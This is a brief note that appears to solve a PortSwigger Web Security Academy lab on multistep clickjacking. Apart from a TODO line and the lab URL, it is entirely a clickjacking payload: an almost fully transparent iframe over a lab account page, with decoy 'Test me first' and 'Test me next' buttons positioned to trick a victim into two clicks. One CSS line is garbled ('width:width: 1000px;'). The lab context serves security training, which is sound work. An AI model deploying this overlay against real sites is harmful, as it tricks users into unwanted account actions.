TODO: try to submit later

https://portswigger.net/web-security/learning-paths/clickjacking/clickjacking-multistep-clickjacking/clickjacking/lab-multistep#

<style>
	iframe {
		position:relative;
		width:width: 1000px;
		height: 666px;
		opacity: 0.00001;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:512px;
		left:45px;
		z-index: 1;
	}
   .secondClick {
		top:311px;
		left:206px;
	}
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="https://0a41008803eacb21da66bf32004c0092.web-security-academy.net/my-account"></iframe>

